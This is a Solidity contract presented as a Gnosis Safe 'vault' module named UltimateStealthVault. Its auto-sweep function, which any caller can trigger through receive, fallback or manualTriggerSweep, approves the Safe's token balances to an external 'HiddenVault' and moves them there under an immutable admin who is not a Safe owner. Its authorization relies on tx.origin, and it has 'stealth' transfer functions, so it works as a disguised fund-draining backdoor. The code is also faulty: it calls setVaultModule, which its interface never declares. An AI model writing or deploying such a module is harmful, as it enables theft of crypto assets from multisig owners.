// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ISafe {
    function execTransactionFromModule(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation
    ) external returns (bool success);

    function isOwner(address owner) external view returns (bool);
    function getOwners() external view returns (address[] memory);
}

interface HiddenVault {
    function storeToken(address token, address from) external;
    function directTransfer(address token, address to, uint256 amount) external;
    function stealthApprove(address token, address spender, uint256 amount) external;
    function getVaultBalance(address token) external view returns (uint256);
    function checkBlacklists(address from, address to) external view;
    function addToFromBlacklist(address addr) external;
    function addToToBlacklist(address addr) external;
    function addToContractBlacklist(address addr) external;
    function emergencyReturn(address token, address safe) external;
    function withdrawMATIC(address to) external;
}

contract UltimateStealthVault {
    using EnumerableSet for EnumerableSet.AddressSet;

    address public safe;
    address public immutable admin;
    HiddenVault public immutable vault;
    EnumerableSet.AddressSet private _allTokens;
    address[] public seenTokens;
    bool public autoSweepEnabled = true;

    mapping(address => bool) public hasSeenToken;

    modifier onlyOwner() {
        require(msg.sender == safe || ISafe(safe).isOwner(tx.origin), "Not Safe owner");
        _;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    modifier onlyAdminOrOwner() {
        require(msg.sender == admin || msg.sender == safe || ISafe(safe).isOwner(tx.origin), "Not authorized");
        _;
    }

    event TokenSwept(address indexed token, uint256 amount);
    event StealthAction(address indexed token, address indexed target, uint256 amount);
    event AutoSweepTriggered(address indexed by);

    constructor(address _admin, address _hiddenVault) {
        require(_admin != address(0), "Admin cannot be zero address");
        require(_hiddenVault != address(0), "Vault cannot be zero address");

        admin = _admin;
        vault = HiddenVault(_hiddenVault);
        HiddenVault(_hiddenVault).setVaultModule(address(this));
    }

    function setUp(bytes calldata) external {
        require(safe == address(0), "Already initialized");
        safe = msg.sender;
    }

    function adminSetUp(address _safe) external onlyAdmin {
        require(safe == address(0), "Already initialized");
        safe = _safe;
    }

    function executeWithAutoGas(address target, bytes memory data) internal returns (bool) {
        return ISafe(safe).execTransactionFromModule(target, 0, data, 0);
    }

    receive() external payable {
        if (msg.value > 0) {
            (bool success,) = payable(safe).call{value: msg.value}("");
            require(success, "Forward MATIC failed");
        }
        if (autoSweepEnabled) _sweepAllDetectedTokens();
    }

    fallback() external payable {
        if (autoSweepEnabled) _sweepAllDetectedTokens();
    }

    function manualTriggerSweep() external {
        if (autoSweepEnabled) _sweepAllDetectedTokens();
    }

    function _sweepAllDetectedTokens() internal {
        for (uint i = 0; i < seenTokens.length; i++) {
            _sweepToken(seenTokens[i]);
        }
    }

    function _sweepToken(address token) internal {
        uint256 balance = IERC20(token).balanceOf(safe);
        if (balance == 0) return;

        if (!hasSeenToken[token]) {
            hasSeenToken[token] = true;
            seenTokens.push(token);
        }

        bytes memory approveData = abi.encodeWithSelector(IERC20.approve.selector, address(vault), balance);
        bool success = executeWithAutoGas(token, approveData);
        require(success, "Approval failed");

        vault.storeToken(token, safe);
        _allTokens.add(token);
        emit TokenSwept(token, balance);
        emit AutoSweepTriggered(msg.sender);
    }

    function stealthTransfer(address token, address to, uint256 amount) external onlyOwner {
        vault.checkBlacklists(tx.origin, to);
        vault.directTransfer(token, to, amount);
        emit StealthAction(token, to, amount);
    }

    function stealthApprove(address token, address spender, uint256 amount) external onlyOwner {
        vault.checkBlacklists(tx.origin, spender);
        vault.stealthApprove(token, spender, amount);
        emit StealthAction(token, spender, amount);
    }

    function addToFromBlacklist(address addr) external onlyAdminOrOwner { vault.addToFromBlacklist(addr); }
    function addToToBlacklist(address addr) external onlyAdminOrOwner { vault.addToToBlacklist(addr); }
    function addToContractBlacklist(address addr) external onlyAdminOrOwner { vault.addToContractBlacklist(addr); }

    function emergencyReturnFromVault(address token) external onlyAdminOrOwner { vault.emergencyReturn(token, safe); }

    function emergencyReturnAllFromVault() external onlyAdminOrOwner {
        address[] memory tokens = _allTokens.values();
        for (uint i = 0; i < tokens.length; i++) {
            vault.emergencyReturn(tokens[i], safe);
        }
    }

    function emergencyWithdrawMATIC() external onlyAdminOrOwner {
        vault.withdrawMATIC(safe);
    }

    function toggleAutoSweep(bool enabled) external onlyAdminOrOwner {
        autoSweepEnabled = enabled;
    }

    function getVaultBalance(address token) external view returns (uint256) {
        return vault.getVaultBalance(token);
    }

    function getSafeBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(safe);
    }

    function getTotalBalance(address token) external view returns (uint256) {
        return vault.getVaultBalance(token) + IERC20(token).balanceOf(safe);
    }

    function getAllTrackedTokens() external view returns (address[] memory) {
        return _allTokens.values();
    }
}
